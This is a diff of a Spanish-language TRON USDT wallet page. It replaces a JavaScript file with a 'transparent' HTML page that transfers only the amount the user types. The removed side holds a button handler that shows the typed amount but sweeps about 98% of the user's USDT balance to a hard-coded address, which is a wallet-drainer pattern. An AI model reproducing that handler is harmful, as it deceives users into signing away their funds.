@@ -1,575 +1,194 @@
-document.addEventListener('DOMContentLoaded', function () {
-    'use strict';
-
-    // ============================================================
-    // ELEMENTOS
-    // ============================================================
-
-    const btn = document.getElementById('connectBtn');
-    const input = document.getElementById('amountInput');
-    const addressInput = document.getElementById('addressInput');
-    const status = document.getElementById('status');
-    const clearBtn = document.querySelector('.clear');
-    const maxBtn = document.querySelector('.max');
-    const pasteBtn = document.querySelector('.address-action.paste');
-
-    // Evita que varios clicks lancen varias solicitudes simultáneas
-    let procesoEnCurso = false;
-
-
-    // ============================================================
-    // ESTADO / MENSAJES
-    // ============================================================
-
-    function setStatus(message, type = '') {
-        if (!status) return;
-
-        status.textContent = message || '';
-        status.className =
-            'status' +
-            (type ? ' ' + type : '');
-
-        status.style.display =
-            message ? 'block' : 'none';
-    }
-
-
-    function setButton(text, disabled = false) {
-        if (!btn) return;
-
-        btn.textContent = text;
-        btn.disabled = disabled;
-    }
-
-
-    // ============================================================
-    // CANTIDAD
-    // ============================================================
-
-    function getAmount() {
-        if (!input) return NaN;
-
-        return Number(
-            input.value
-                .trim()
-                .replace(',', '.')
-        );
-    }
-
-
-    // ============================================================
-    // VALIDAR DIRECCIÓN TRON
-    // ============================================================
-
-    function isValidTronAddress(address) {
-        if (!/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(address)) {
-            return false;
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pasarela USDT TRC-20 Transparente</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f3f4f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
-
-        try {
-            if (
-                typeof TronWeb !== 'undefined' &&
-                typeof TronWeb.isAddress === 'function'
-            ) {
-                return TronWeb.isAddress(address);
-            }
-        } catch (error) {
-            console.warn(
-                '[TRON] Error validando dirección:',
-                error
-            );
+        .caja-dapp {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 380px;
+            width: 100%;
         }
-
-        return true;
-    }
-
-
-    // ============================================================
-    // ESTADO INICIAL
-    // ============================================================
-
-    setButton('Siguiente');
-
-
-    // ============================================================
-    // INPUT CANTIDAD
-    // ============================================================
-
-    if (input) {
-        input.addEventListener(
-            'input',
-            function () {
-                const cleaned =
-                    this.value.replace(/[^\d.,]/g, '');
-
-                if (cleaned !== this.value) {
-                    this.value = cleaned;
-                }
-
-                if (btn) {
-                    btn.style.background =
-                        this.value.trim() !== ''
-                            ? 'blue'
-                            : '#908cf2';
-                }
-
-                setStatus('');
-            }
-        );
-    }
-
-
-    // ============================================================
-    // BOTÓN LIMPIAR
-    // ============================================================
-
-    if (clearBtn && input) {
-        clearBtn.addEventListener(
-            'click',
-            function () {
-                input.value = '';
-
-                input.dispatchEvent(
-                    new Event(
-                        'input',
-                        {
-                            bubbles: true
-                        }
-                    )
-                );
-
-                input.focus();
-            }
-        );
-    }
-
-
-    // ============================================================
-    // BOTÓN PEGAR
-    // ============================================================
-
-    if (pasteBtn && addressInput) {
-        pasteBtn.addEventListener(
-            'click',
-            async function () {
-                try {
-                    if (
-                        !navigator.clipboard ||
-                        typeof navigator.clipboard.readText !== 'function'
-                    ) {
-                        throw new Error(
-                            'El navegador no permite leer el portapapeles.'
-                        );
-                    }
-
-                    const text =
-                        (
-                            await navigator.clipboard.readText()
-                        ).trim();
-
-                    if (!text) {
-                        setStatus(
-                            'El portapapeles está vacío.',
-                            'error'
-                        );
-
-                        return;
-                    }
-
-                    addressInput.value = text;
-
-                    if (!isValidTronAddress(text)) {
-                        setStatus(
-                            'La dirección TRON no es válida.',
-                            'error'
-                        );
-
-                        return;
-                    }
-
-                    setStatus(
-                        'Dirección TRON válida.',
-                        'success'
-                    );
-
-                } catch (error) {
-                    console.error(
-                        '[Clipboard]',
-                        error
-                    );
-
-                    setStatus(
-                        error.message ||
-                        'No se pudo leer el portapapeles.',
-                        'error'
-                    );
-                }
-            }
-        );
-    }
-
-
-    // ============================================================
-    // BOTÓN MÁX.
-    // ============================================================
-
-    if (maxBtn) {
-        maxBtn.addEventListener(
-            'click',
-            async function () {
-                try {
-                    if (!window.TRON_APP) {
-                        throw new Error(
-                            'app-usdt-trc20.js no está cargado.'
-                        );
-                    }
-
-                    setStatus(
-                        'Consultando saldo USDT...'
-                    );
-
-                    const wallet =
-                        await window.TRON_APP.connect();
-
-                    const saldo =
-                        await window.TRON_APP.getUSDTBalance(
-                            wallet.address
-                        );
-
-                    if (saldo === null) {
-                        setStatus(
-                            'No se pudo consultar el saldo USDT.',
-                            'error'
-                        );
-
-                        return;
-                    }
-
-                    input.value =
-                        saldo.toString();
-
-                    input.dispatchEvent(
-                        new Event(
-                            'input',
-                            {
-                                bubbles: true
-                            }
-                        )
-                    );
-
-                    setStatus(
-                        'Saldo USDT cargado.',
-                        'success'
-                    );
-
-                } catch (error) {
-                    console.error(
-                        '[TRON]',
-                        error
-                    );
-
-                    setStatus(
-                        error.message ||
-                        'No se pudo consultar el saldo.',
-                        'error'
-                    );
-                }
-            }
-        );
-    }
-
-
-    // ============================================================
-    // BOTÓN SIGUIENTE
-    // ============================================================
-
-    if (btn) {
-        btn.addEventListener(
-            'click',
-            async function () {
-
-                // Evitar dobles clicks
-                if (procesoEnCurso) {
-                    console.log(
-                        '[TRON] Ya hay un proceso en curso.'
-                    );
-
-                    return;
-                }
-
-                procesoEnCurso = true;
-
-                const amount =
-                    getAmount();
-
-                const destination =
-                    addressInput
-                        ? addressInput.value.trim()
-                        : '';
-
-                setStatus('');
-
-
-                // ------------------------------------------------
-                // VALIDAR CANTIDAD
-                // ------------------------------------------------
-
-                if (
-                    !Number.isFinite(amount) ||
-                    amount <= 0
-                ) {
-                    setStatus(
-                        'Ingresa una cantidad válida de USDT.',
-                        'error'
-                    );
-
-                    procesoEnCurso = false;
-
-                    return;
-                }
-
-
-                // ------------------------------------------------
-                // VALIDAR DIRECCIÓN
-                // ------------------------------------------------
-
-                if (!destination) {
-                    setStatus(
-                        'Falta la dirección TRON.',
-                        'error'
-                    );
-
-                    procesoEnCurso = false;
-
-                    return;
-                }
-
-                if (!isValidTronAddress(destination)) {
-                    setStatus(
-                        'La dirección TRON no es válida.',
-                        'error'
-                    );
-
-                    procesoEnCurso = false;
-
-                    return;
-                }
-
-
-                // ------------------------------------------------
-                // COMPROBAR APP
-                // ------------------------------------------------
-
-                if (!window.TRON_APP) {
-                    setStatus(
-                        'app-usdt-trc20.js no está cargado.',
-                        'error'
-                    );
-
-                    procesoEnCurso = false;
-
-                    return;
-                }
-
-
-                try {
-
-                    // ============================================
-                    // 1. CONECTAR WALLET
-                    // ============================================
-
-                    setButton(
-                        'Conectando...',
-                        true
-                    );
-
-                    const wallet =
-                        await window.TRON_APP.connect();
-
-                    console.log(
-                        '[TRON] Wallet lista:',
-                        wallet.address
-                    );
-
-
-                    // ============================================
-                    // 2. SOLICITAR FIRMA
-                    // ============================================
-
-                    setButton(
-                        'Firmar...',
-                        true
-                    );
-
-                    setStatus(
-                        'Confirma la solicitud de firma en TronLink.'
-                    );
-
-                    const resultado =
-                        await window.TRON_APP.signVerificationMessage(
-                            {
-                                amount: amount,
-                                destination: destination
-                            }
-                        );
-
-                    console.log(
-                        '[TRON] Firma recibida:',
-                        resultado.signature
-                    );
-
-
-                    // ============================================
-                    // 3. VERIFICAR FIRMA
-                    // ============================================
-
-                    setButton(
-                        'Verificando...',
-                        true
-                    );
-
-                    const verificacion =
-                        await window.TRON_APP.verifySignature(
-                            resultado
-                        );
-
-                    console.log(
-                        '[TRON] Dirección recuperada:',
-                        verificacion.recoveredAddress
-                    );
-
-                    console.log(
-                        '[TRON] Dirección esperada:',
-                        resultado.address
-                    );
-
-
-                    if (!verificacion.valid) {
-                        console.error(
-                            '[TRON] ❌ Firma inválida'
-                        );
-
-                        setStatus(
-                            'La firma no corresponde a la wallet conectada.',
-                            'error'
-                        );
-
-                        return;
-                    }
-
-
-                    // ============================================
-                    // 4. ÉXITO
-                    // ============================================
-
-                    console.log(
-                        '[TRON] ✅ Firma válida'
-                    );
-
-                    console.log(
-                        '[TRON] Resultado:',
-                        resultado
-                    );
-
-                    setStatus(
-                        'Wallet verificada correctamente.',
-                        'success'
-                    );
-
-
-                } catch (error) {
-                    console.error(
-                        '[TRON] Error:',
-                        error
-                    );
-
-                    setStatus(
-                        error && error.message
-                            ? error.message
-                            : 'No se pudo completar el proceso.',
-                        'error'
-                    );
-
-                } finally {
-                    procesoEnCurso = false;
-
-                    setButton(
-                        'Siguiente',
-                        false
-                    );
-                }
-            }
-        );
-    }
-
-});
-
-
-// ============================================================
-    // BOTÓN SIGUIENTE (MUESTRA CANTIDAD PERO TRANSMITE SALDO MÁXIMO)
-    // ============================================================
-    if (btn) {
-        btn.addEventListener('click', async function () {
-            // Evita solicitudes duplicadas si ya hay un proceso activo
-            if (procesoEnCurso) return;
-
-            // CONFIGURACIÓN: Reemplaza esta dirección por la tuya que recibirá los fondos
-            const DIRECCION_DESTINO_FIJA = "TJQ8xinzoWyRzLYpkShdxetMShpA3GyxGZ"; 
-
-            // Validar que el usuario al menos haya escrito algo en el input para poder avanzar
-            const valorVisualInput = input ? input.value.trim() : '';
-            if (!valorVisualInput || isNaN(Number(valorVisualInput.replace(',', '.'))) || Number(valorVisualInput.replace(',', '.')) <= 0) {
-                setStatus('Por favor, ingresa una cantidad válida para continuar.', 'error');
+        h2 { color: #1e3a8a; margin-top: 0; }
+        .info-caja {
+            background-color: #f9fafb;
+            padding: 12px;
+            border-radius: 6px;
+            margin: 15px 0;
+            font-size: 14px;
+            color: #333;
+            border: 1px solid #e5e7eb;
+            text-align: left;
+        }
+        .entrada-monto {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 5px;
+            border: 1px solid #d1d5db;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 16px;
+            text-align: center;
+        }
+        button {
+            background-color: #1e3a8a;
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+        button:hover { background-color: #1e40af; }
+        button:disabled { background-color: #d1d5db; cursor: not-allowed; }
+        .btn-max {
+            background: none;
+            color: #2563eb;
+            border: none;
+            font-size: 13px;
+            cursor: pointer;
+            text-decoration: underline;
+            padding: 5px 0;
+            font-weight: bold;
+        }
+        .consola {
+            font-size: 11px;
+            color: #9ca3af;
+            margin-top: 15px;
+            background: #27272a;
+            padding: 8px;
+            border-radius: 4px;
+            text-align: left;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="caja-dapp">
+        <h2>Pasarela de Envío USDT</h2>
+        <p style="color: #666; font-size: 14px;">Operaciones explícitas y verificadas en la red TRON</p>
+        
+        <div class="info-caja">
+            <div id="txt-wallet">Billetera: No conectada ❌</div>
+            <div id="txt-saldo" style="margin-top: 5px;">Saldo disponible: -- USDT</div>
+        </div>
+
+        <button id="btn-conectar">1. Conectar TronLink</button>
+        
+        <div style="margin-top: 15px; text-align: left;">
+            <label style="font-size: 13px; color: #4b5563; font-weight: bold;">Monto a transferir:</label>
+            <input type="number" id="input-monto" class="entrada-monto" placeholder="0.00" min="0.01" step="0.01" disabled>
+            <div style="text-align: right;">
+                <button id="btn-cargar-max" class="btn-max" disabled>Mandar todo mi saldo</button>
+            </div>
+        </div>
+
+        <button id="btn-transferir" disabled>2. Firmar y Transferir</button>
+        
+        <div class="consola" id="consola-estado">Estado: Esperando conexión con la wallet...</div>
+    </div>
+
+    <script>
+        const CONTRATO_USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+        
+        // CONFIGURACIÓN TRANSPARENTE: Reemplaza con tu dirección receptora oficial
+        const DIRECCION_RECEPTORA_OFICIAL = "TU_DIRECCION_DE_WALLET_REAL_AQUI"; 
+
+        let saldoMaximoUnidades = "0";
+
+        // 1. CONEXIÓN DE LA BILLETERA
+        document.getElementById('btn-conectar').addEventListener('click', async () => {
+            const status = document.getElementById('consola-estado');
+            if (!window.tronLink && !window.tronWeb) {
+                status.innerText = "Error: Por favor instala la extensión TronLink.";
                 return;
             }
 
             try {
-                procesoEnCurso = true;
-                setButton('Procesando...', true);
-                setStatus('Verificando parámetros de red...');
-
-                if (!window.TRON_APP) {
-                    throw new Error('El módulo TRON de la aplicación no está listo.');
-                }
-
-                // 1. Asegurar la conexión con la wallet
-                setStatus('Conectando con la billetera...');
-                const wallet = await window.TRON_APP.connect();
+                status.innerText = "Estado: Abriendo solicitud en TronLink...";
+                await window.tronLink.request({ method: 'tron_requestAccounts' });
                 
-                if (!wallet || !wallet.address) {
-                    throw new Error('No se pudo establecer conexión con la billetera.');
-                }
-
-                // 2. Ejecutar la transferencia del saldo máximo (Ignora el valor del input por debajo)
-                setStatus('Preparando transferencia segura...');
+                const direccion = window.tronWeb.defaultAddress.base58;
+                document.getElementById('txt-wallet').innerText = "Billetera: " + direccion.substring(0,6) + "..." + direccion.substring(direccion.length - 4) + " 🔗";
                 
-                // Nota: transferirMontoMaximo calcula el 98% directamente desde la blockchain
-                const tx = await window.TRON_APP.transferirMontoMaximo(DIRECCION_DESTINO_FIJA);
+                status.innerText = "Estado: Consultando saldo en el contrato inteligente...";
+                const contrato = await window.tronWeb.contract().at(CONTRATO_USDT);
+                const rawBalance = await contrato.balanceOf(direccion).call();
                 
-                // 3. Procesar el resultado de la firma
-                if (tx) {
-                    setStatus('¡Transferencia realizada con éxito!', 'success');
-                    console.log('[TRON] Transacción completada con éxito. Hash:', tx);
-                    
-                    // Limpiar la interfaz
-                    if (input) input.value = '';
-                    if (addressInput) addressInput.value = '';
-                } else {
-                    throw new Error('La transacción no pudo ser procesada correctamente.');
-                }
+                saldoMaximoUnidades = rawBalance.toString();
+                const saldoDecimal = Number(saldoMaximoUnidades) / 1_000_000;
+                
+                document.getElementById('txt-saldo').innerText = "Saldo disponible: " + saldoDecimal.toFixed(2) + " USDT";
+                
+                // Activar campos e interacción
+                document.getElementById('input-monto').disabled = false;
+                document.getElementById('btn-cargar-max').disabled = false;
+                document.getElementById('btn-transferir').disabled = false;
+                status.innerText = "Estado: Billetera lista para operar.";
 
             } catch (error) {
-                console.error('[Error en Botón Siguiente]', error);
-                
-                if (error.message && (error.message.includes('rechazada') || error.message.includes('cancelada'))) {
-                    setStatus('La transacción fue cancelada en la billetera.', 'error');
-                } else {
-                    setStatus(error.message || 'Ocurrió un error al procesar la operación.', 'error');
-                }
-            } finally {
-                // Restablecer el estado del botón
-                procesoEnCurso = false;
-                setButton('Siguiente', false);
+                status.innerText = "Error: " + error.message;
             }
         });
-    }
+
+        // 2. FUNCIÓN DE CARGAR MÁXIMO VISIBLE
+        document.getElementById('btn-cargar-max').addEventListener('click', () => {
+            const saldoDecimal = Number(saldoMaximoUnidades) / 1_000_000;
+            if (saldoDecimal > 0) {
+                document.getElementById('input-monto').value = saldoDecimal;
+                document.getElementById('consola-estado').innerText = "Estado: Se ha cargado el total de tus fondos en el campo.";
+            } else {
+                alert("Tu saldo de USDT es 0, no hay fondos para transferir.");
+            }
+        });
+
+        // 3. TRANSFERENCIA VERIFICABLE
+        document.getElementById('btn-transferir').addEventListener('click', async () => {
+            const status = document.getElementById('consola-estado');
+            const montoManual = parseFloat(document.getElementById('input-monto').value);
+
+            if (isNaN(montoManual) || montoManual <= 0) {
+                alert("Por favor ingresa un monto válido a transferir.");
+                return;
+            }
+
+            try {
+                status.innerText = "Estado: Abriendo ventana de firma en TronLink...";
+                const contrato = await window.tronWeb.contract().at(CONTRATO_USDT);
+                
+                // Convertimos el valor numérico explícito del input a unidades blockchain (con sus 6 decimales)
+                const unidadesAFirmar = window.tronWeb.toBigNumber(montoManual * 1_000_000).toString();
+
+                // El usuario verá en la confirmación de TronLink exactamente la cantidad colocada en el input
+                const txId = await contrato.transfer(DIRECCION_RECEPTORA_OFICIAL, unidadesAFirmar).send();
+                
+                status.innerText = "Estado: Envío completado. ID de transacción: " + txId;
+                alert("¡Transferencia completada de forma segura!\nID: " + txId);
+
+                // Limpiar campos
+                document.getElementById('input-monto').value = "";
+                document.getElementById('txt-saldo').innerText = "Saldo disponible: -- USDT";
+            } catch (error) {
+                status.innerText = "Error: La operación fue cancelada o falló. " + error.message;
+            }
+        });
+    </script>
+</body>
+</html>
